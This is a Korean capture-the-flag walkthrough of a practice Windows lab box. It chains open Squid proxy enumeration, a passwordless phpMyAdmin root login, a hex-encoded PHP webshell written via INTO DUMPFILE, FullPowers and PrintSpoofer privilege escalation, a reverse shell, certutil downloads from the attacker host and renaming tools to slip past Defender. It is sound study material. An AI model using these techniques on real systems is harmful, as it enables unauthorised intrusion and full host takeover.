> [!info] PG Practice — Pentester Foundations #6 · **첫 Windows 박스**
> **타겟** 192.168.248.189 · **OS** Windows Server 2019 Standard (build 17763, 호스트명 `SQUID`) · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 3128 Squid **오픈 프록시**로 내부 포트 열거 → 8080 phpMyAdmin(root 무비번) → `INTO OUTFILE` 웹셸 → `LOCAL SERVICE` → **FullPowers**로 SeImpersonate 복원 → **PrintSpoofer** → SYSTEM

### Nmap — 외부에서 보이는 것

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.189
Nmap scan report for 192.168.248.189
Host is up (0.094s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Running (JUST GUESSING): Microsoft Windows 2019 (92%)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**웹 포트가 3128 하나뿐이다.** 80도 443도 없다. 나머지 65529개는 `filtered`(무응답) — 방화벽이 막고 있다.

> [!warning] 여기서 "공격면이 없다"고 결론내면 박스가 끝난다
> 보이는 것은 SMB/RPC와 **프록시** 하나. 그런데 **프록시는 그 자체가 공격면이 아니라 통로**다.
> Squid가 인증 없이 열려 있으면(오픈 프록시) **방화벽 뒤의 포트를 프록시가 대신 열어준다.** 외부 스캔 결과는 이 박스의 절반도 보여주지 않는다.

### 프록시 경유 내부 포트 열거 — 이 박스의 전부

Squid는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계한다. **응답 코드로 내부 포트의 개폐를 판별**할 수 있다:

| 응답 | 의미 |
|---|---|
| `503` + `X-Squid-Error: ERR_CONNECT_FAIL` | 내부 포트 **닫힘** (프록시가 연결 실패) |
| `403` + `ERR_ACCESS_DENIED` | Squid **Safe_ports ACL이 차단** — 개폐 판별 불가 |
| 그 외 (200/400/404/405…) | 내부 포트 **열림** |

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ for p in 8080 3306 5985 47001 9999 3307; do
      R=$(curl -s -o /dev/null -m 8 -w '%{http_code}' -x http://192.168.248.189:3128 http://127.0.0.1:$p/)
      echo "port $p -> HTTP $R"
    done
port 8080  -> HTTP 200     ← 열림
port 3306  -> HTTP 200     ← 열림
port 5985  -> HTTP 404     ← 열림
port 47001 -> HTTP 404     ← 열림
port 9999  -> HTTP 503     ← 닫힘
port 3307  -> HTTP 503     ← 닫힘
```

전 포트를 병렬로 돌려 얻은 결과:

| 내부 포트 | 서비스 | 외부 노출 |
|---|---|---|
| **3128** | Squid 자신 (`400 ERR_INVALID_URL`) | ✅ |
| **3306** | **MySQL 5.7.31** | ❌ |
| **5985** | **WinRM** (`Microsoft-HTTPAPI/2.0`) | ❌ |
| **8080** | **Apache 2.4.46 (Win64) / WampServer** | ❌ |
| **47001** | WinRM HTTP listener | ❌ |

> [!tip] 자동화 도구
> `spose.py` (https://github.com/aancw/spose) 가 이 작업을 해준다:
> ```bash
> python3 spose.py --proxy http://192.168.248.189:3128 --target 192.168.248.189
> ```
> 다만 **판별 기준을 직접 이해하고 있어야** 도구가 놓치거나 오판할 때 수동으로 확인할 수 있다. 위의 `503 vs 200` 대비가 그 기준이다.

MySQL 배너도 프록시를 통해 그대로 샌다 (HTTP/0.9로 감싸져 나온다):

```
X-Transformed-From: HTTP/0.9
Via: 1.1 SQUID (squid/4.14)

J^@^@^@
5.7.31^@^M^@^@^@Q!^_^KH7^SZ ... mysql_native_password ... Got packets out of order
```

**MySQL 5.7.31**, 인증 플러그인 `mysql_native_password`.

> [!warning] 프록시 열거의 한계 — 정직하게 기록할 것
> Squid의 `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) **밖의 1024 미만 포트는 전부 403**이라 개폐를 판별할 수 없다.
> `CONNECT` 메서드도 전부 차단됐고(SSL_ports가 443만 허용), cache manager(`/squid-internal-mgr/info`)도 403이라 설정 덤프도 불가능하다.
> **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다르다.** 보고서에는 후자를 명시해야 한다.

### 내부 서비스 식별 (전부 프록시 경유)

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -I -x http://192.168.248.189:3128 http://127.0.0.1:8080/ | grep -iE 'Server|X-Powered'
Server: Apache/2.4.46 (Win64) PHP/7.3.21
X-Powered-By: PHP/7.3.21
```

WampServer 홈페이지가 **구성 전체를 렌더한다**:

```
Version 3.2.3 - 64bit
Apache Version: 2.4.46          PHP Version: 7.3.21
MySQL Version: 5.7.31 - Port defined for MySQL: 3306 - default DBMS
MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307
Your Aliases: adminer  phpmyadmin  phpsysinfo
```

MariaDB 3307은 정의만 돼 있고 실제로는 `503`(미기동)이다 — **설정에 적혀 있다고 떠 있는 게 아니다.**

버전 확정 (런타임 렌더 값 우선):

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/phpmyadmin/ | grep -oE 'PMA_VERSION:"[0-9.]+"'
PMA_VERSION:"5.0.2"

┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/adminer/ | grep -oE 'version=[0-9.]+'
version=4.7.7
```

| 앱 | 버전 | 교차 근거 |
|---|---|---|
| **phpMyAdmin** | **5.0.2** | 인라인 JS `PMA_VERSION` + 자산 캐시버스터 `?v=5.0.2` (런타임) / `doc/html/index.html` `<title>` / `RELEASE-DATE-5.0.2` |
| **Adminer** | **4.7.7** | CSS·JS 두 자산의 `version=` 파라미터 (런타임) |
| phpSysInfo | 3.3.2 | `<Generation version="3.3.2">` |

### phpSysInfo — 인증 없이 호스트 정보 대량 유출

`xml.php?plugin=complete` 가 인증 없이 응답한다:

```xml
<Vitals Hostname="SQUID" IPAddr="127.0.0.1" Kernel="10.0.17763 (64-bit)"
        Distro="Microsoft Windows Server 2019 Standard" Uptime="2904550" Processes="62" OS="WINNT"/>
<NetDevice Name="vmxnet3 Ethernet Adapter" Info="Ethernet0 2;00-50-56-AB-78-FF;192.168.248.189;10Gb/s"/>
<Hardware Name="VMware, Inc. VMware7,1"><CpuCore Model="AMD EPYC 7413 24-Core Processor"/>
<Mount FSType="NTFS" Name="Local Disk" Total="31566327808" MountPoint="C:"/>
```

호스트명 `SQUID`, **Windows Server 2019 Standard build 17763**, MAC, VMware 게스트, C: 30GB NTFS. nmap의 OS 추측(92% Windows Server 2019)과 교차 일치한다.

`?phpinfo=1` 은 **설치 경로**를 준다:

```
System   Windows NT SQUID 10.0 build 17763 AMD64
Loaded Configuration File   C:\wamp\bin\apache\apache2.4.46\bin\php.ini
```

→ **wamp 경로 `C:\wamp\`**, 웹루트는 `C:\wamp\www\`. `INTO OUTFILE`로 웹셸을 떨어뜨릴 때 이 경로가 필요하다.

### 결정적 단서 — `/testmysql.php`

wamp 기본 스크립트가 **인증 없이 MySQL 접속에 성공**하고 있다:

```
Connection OK 127.0.0.1 via TCP/IP
Server 5.7.31
Initial charset: latin1
```

wamp 기본값은 **`root` / 빈 패스워드**다. 이 한 줄이 phpMyAdmin 로그인 자격증명을 사실상 확정해준다.

> [!tip] 남이 만들어둔 진단 스크립트를 찾아라
> `testmysql.php`·`info.php`·`phpinfo.php`·`test.php`·`db_test.php` 같은 **개발자 편의 스크립트**는 인증 없이 내부 연결 정보를 확인해주는 경우가 많다.
> 여기서는 "DB에 무비번으로 붙는다"는 사실을 **로그인 시도 한 번 없이** 알아냈다.

### 디렉터리 열거

외부 웹 포트가 없어서 **8080을 프록시 경유로** 열거했다. 프록시를 거치면 매우 느려서 대규모 워드리스트는 부적합하다(300초 제한에 걸려 미완주 — **부분 커버리지**).

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ gobuster dir -u http://127.0.0.1:8080/ --proxy http://192.168.248.189:3128 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
/index.php    (Status: 200) [Size: 6448]
/Index.php    (Status: 200) [Size: 6448]     ← 대소문자 무시 = Windows 파일시스템
/INDEX.php    (Status: 200) [Size: 6448]
/phpmyadmin   (Status: 301)
/favicon.ico  (Status: 200)
```

타겟형 프로브가 훨씬 효율적이었다 — `/adminer`, `/phpsysinfo`, `/wampthemes`, `/testmysql.php` 전부 적중. **WampServer 홈페이지가 이미 alias 목록(`adminer phpmyadmin phpsysinfo`)을 알려줬기 때문**이다.

> [!note] 같은 파일이 대소문자만 바꿔 여러 번 나오면 Windows다
> `/index.php`·`/Index.php`·`/INDEX.php`가 전부 200 = **대소문자 구분 없는 파일시스템**. OS 판별의 부수 신호다.

### Foothold — phpMyAdmin `root` 무비번 → `INTO DUMPFILE` 웹셸

프록시 경유라서 브라우저 대신 스크립트로 몬다. `requests.Session`에 프록시를 물리되 **`trust_env=False`**가 중요하다(환경변수 프록시 설정이 끼어드는 것을 막는다).

```python
# ~/PG/Squid/pma.py 핵심
s = requests.Session()
s.trust_env = False
s.proxies = {'http': 'http://192.168.248.189:3128'}
# 1) 로그인 페이지에서 token/set_session 추출
# 2) index.php 에 POST: pma_username=root, pma_password=, server=1
# 3) 응답의 새 token 으로 import.php 에 POST: sql_query=...
```

phpMyAdmin은 요청마다 **토큰이 갱신**된다. 로그인 응답에서 새 토큰을 다시 뽑아야 SQL이 실행된다.

첫 정찰 쿼리:

```sql
SELECT @@version, USER(), @@datadir, @@secure_file_priv, @@basedir;
```
```
5.7.31
root@localhost
C:\wamp\bin\mysql\mysql5.7.31\data\
                                     ← @@secure_file_priv 가 빈 문자열
C:\wamp\bin\mysql\mysql5.7.31\
```

> [!danger] `@@secure_file_priv`가 빈 문자열 = 파일 쓰기 무제한
> 이 변수가 특정 디렉터리로 설정돼 있으면 `INTO OUTFILE`/`INTO DUMPFILE`은 그 안에만 쓸 수 있다. **`NULL`이면 완전 차단, 빈 문자열이면 아무 데나 쓸 수 있다.**
> MySQL로 파일 쓰기를 시도하기 전에 **반드시 이 값부터 확인**한다. 확인 안 하고 페이로드를 던지면 왜 실패하는지 모른 채 시간을 태운다.

웹셸을 심는다. **따옴표가 여러 계층(HTTP → PHP → SQL)을 지나며 깨지는 것을 피하려고 hex 리터럴**을 썼다:

```php
<?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
```

```sql
SELECT 0x3c3f706870206563686f202250574e3a223b20696628697373657428245f524551554553545b2763275d29297b206563686f207368656c6c5f6578656328245f524551554553545b2763275d293b207d203f3e0a
INTO DUMPFILE 'C:/wamp/www/sh.php';
```
```
[success] MySQL returned an empty result set (Query took 0.0008 seconds.)
```

> [!tip] `INTO OUTFILE` 대신 `INTO DUMPFILE`
> `OUTFILE`은 행/열 구분자를 삽입해 **바이너리나 정확한 바이트열이 깨진다.** `DUMPFILE`은 단일 행을 **가공 없이 그대로** 쓴다. 웹셸·실행파일을 심을 때는 `DUMPFILE`이 맞다.
> 경로 구분자는 `C:/wamp/www/`처럼 **슬래시**를 쓴다(백슬래시는 SQL 이스케이프와 충돌).

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ cat web.sh
curl -s -m 60 -x http://192.168.248.189:3128 --get --data-urlencode "c=$*" http://127.0.0.1:8080/sh.php

┌──(kali㉿kali)-[~/PG/Squid]
└─$ ./web.sh whoami
PWN:nt authority\local service
```

### Privesc 1단계 — FullPowers로 특권 복원

`LOCAL SERVICE`는 원래 `SeImpersonatePrivilege`를 가지고 있지만, **서비스로 실행되지 않은 프로세스에서는 토큰의 특권이 제거된 상태**로 시작한다.

```
PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**3개뿐이다.** PrintSpoofer가 요구하는 `SeImpersonatePrivilege`가 없다.

[FullPowers](https://github.com/itm4n/FullPowers)는 **예약 작업(scheduled task)으로 자기 자신을 재기동**해서 완전한 서비스 토큰을 되찾는다:

```
C:\Users\Public\fp.exe -c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1" -z
[+] Started dummy thread with id 960
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```

```
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ← 복원됨
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

**3개 → 7개.** `SeImpersonatePrivilege` 복원 확인.

> [!warning] `whoami /priv`에 SeImpersonate가 없다고 포기하지 마라
> `LOCAL SERVICE`·`NETWORK SERVICE` 컨텍스트라면 **특권이 "없는" 게 아니라 "박탈된" 것**일 수 있다. FullPowers로 되찾을 수 있는지 먼저 확인한다.
> 이 박스의 설계 의도가 정확히 이 지점이다 — PrintSpoofer만 알고 FullPowers를 모르면 막힌다.

### Privesc 2단계 — PrintSpoofer로 SYSTEM

PrintSpoofer는 **FullPowers가 만든 토큰 안에서** 실행돼야 한다. 중첩 인용을 피하려고 배치 파일로 감쌌다:

```bat
REM C:\Users\Public\go.bat
C:\Users\Public\ps.exe -c "powershell -nop -w hidden -enc <UTF16LE-base64 리버스셸>"
```

```
cmd /c C:\Users\Public\fp.exe -c "cmd /c C:\Users\Public\go.bat" -z
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```

```
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.189] 58526
PS C:\Windows\system32> whoami; hostname
nt authority\system
SQUID
```

SYSTEM 토큰은 특권 **31개 전부 Enabled** (`SeDebugPrivilege`, `SeTcbPrivilege`, `SeTakeOwnershipPrivilege` 포함).

### 플래그

```powershell
PS C:\Windows\system32> "LOCAL=" + (Get-Content C:\local.txt)
LOCAL=02ef1765e826b864a4b6cb74e532398c
PS C:\Windows\system32> "PROOF=" + (Get-Content C:\Users\Administrator\Desktop\proof.txt)
PROOF=45f64bc8483c77cf487fad00f8cb0120
```

| | 위치 | 값 |
|---|---|---|
| `local.txt` | **`C:\local.txt`** ← 비표준 위치 | `02ef1765e826b864a4b6cb74e532398c` |
| `proof.txt` | `C:\Users\Administrator\Desktop\` | `45f64bc8483c77cf487fad00f8cb0120` |

> [!danger] `local.txt`가 `C:\` 루트에 있다
> `C:\Users\`에는 `Administrator`와 `Public`뿐이고 **일반 유저 계정이 없다.** `C:\Users\*\Desktop\local.txt` 패턴으로 찾으면 영원히 못 찾는다.
> **`dir C:\` 한 번**이면 나온다. (`Get-ChildItem C:\ -Recurse`는 리버스셸을 몇 분간 블로킹시키므로 쓰지 말 것)

## 실전 함정 — 파일명 기반 탐지

`FullPowers.exe`·`PrintSpoofer64.exe`라는 **이름 그대로** `certutil`로 받으면:

```
certutil -urlcache -f http://192.168.45.207:8000/PrintSpoofer64.exe PrintSpoofer64.exe
CertUtil: -URLCache command completed successfully.
```

**"성공"이라고 뜨는데 파일이 없다.** `fp.exe`·`ps.exe`로 이름을 바꾸니 정상 저장됐다.

Defender 상태는 `RealTimeProtectionEnabled=False`, `AntivirusEnabled=True` — 실시간 보호는 꺼져 있는데도 **파일명 시그니처**에는 걸린 것이다.

> [!tip] 다운로드 "성공" 메시지를 믿지 말고 `dir`로 확인하라
> AV/EDR은 파일을 조용히 삭제하고 도구에는 성공을 반환하게 두는 경우가 많다. **전송 후 항상 존재 여부를 확인**하고, 안 보이면 **파일명부터 바꿔본다.**

## OSCP 관점 정리

1. **오픈 프록시는 공격면이 아니라 통로다.** 외부 스캔에서 웹 포트가 3128 하나뿐이라 막힌 것처럼 보이지만, 프록시 뒤에 MySQL·WinRM·WampServer가 전부 있었다. **프록시를 만나면 내부 포트 열거가 첫 수순**이다.
2. **판별 기준을 손으로 이해하고 있어라.** `503 ERR_CONNECT_FAIL`=닫힘, 그 외=열림, `403 ERR_ACCESS_DENIED`=ACL 차단(판별 불가). 도구(`spose`)가 오판할 때 직접 확인할 수 있어야 한다.
3. **MySQL 파일 쓰기 전에 `@@secure_file_priv`를 확인한다.** `NULL`=차단, 빈 문자열=무제한, 경로=그 안에서만. 이걸 안 보고 페이로드를 던지면 실패 원인을 모른다.
4. **`INTO DUMPFILE`이 `INTO OUTFILE`보다 맞다.** `OUTFILE`은 구분자를 삽입해 정확한 바이트열을 깨뜨린다. 페이로드는 **hex 리터럴**로 넘겨 인용 계층을 통과시킨다.
5. **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다.** `whoami /priv`가 3개뿐이어도 **FullPowers**로 7개(=`SeImpersonate` 포함)를 되찾을 수 있다. 이걸 모르면 PrintSpoofer 단계까지 못 간다.
6. **다운로드 "성공"을 믿지 말고 `dir`로 확인한다.** 유명 도구는 **파일명만으로도** 삭제된다. `fp.exe`·`ps.exe`처럼 바꿔서 재시도.
7. **플래그가 표준 위치에 없을 수 있다.** 여기서는 `C:\local.txt`. `C:\Users\*\Desktop\` 패턴에만 의존하지 말고 **`dir C:\`를 먼저** 본다. `-Recurse`는 셸을 몇 분간 블로킹시키니 피할 것.

## 남긴 흔적 (랩 정리용)

- **예약 작업**: FullPowers가 2회 실행되며 임시 예약 작업을 생성했으나 **토큰 획득 직후 스스로 삭제**한다. SYSTEM 셸에서 `schtasks /query` 및 `Get-ScheduledTask | Where TaskName -match FullPowers`로 **잔존 없음** 확인.
- **삭제 완료**: `C:\wamp\www\sh.php`, `C:\Users\Public\{fp.exe, ps.exe, go.bat, t.txt, priv_after.txt}`. `dir C:\Users\Public` 재확인 결과 기본 디렉터리 5개만 남음.
- 타겟 원본 데이터는 수정하지 않았다.

## 관련 노트

- [[01. Pentest Foundations]] — Squid 항목
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] — 같은 컬렉션 앞 박스 (전부 Linux)
